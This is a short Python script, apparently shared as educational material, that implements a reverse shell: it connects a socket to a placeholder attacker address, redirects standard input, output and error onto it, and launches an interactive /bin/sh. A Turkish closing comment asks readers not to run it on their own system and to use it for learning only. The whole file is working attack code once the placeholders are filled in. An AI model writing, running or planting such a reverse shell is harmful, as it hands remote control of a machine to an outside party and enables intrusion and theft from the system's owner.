import socket
import subprocess
import os

def reverse_shell(target_ip, target_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    TARGET_IP = "SALDIRI_HEDEF_IP"  # Target IP address
    TARGET_PORT = SALDIRI_HEDEF_PORT  # Target port number
    reverse_shell(TARGET_IP, TARGET_PORT)

# Sisteminizde çalıştırmayınız ve lütfen eğitim amaçlı kullanınız
# Produced by Kamil Umut Araz
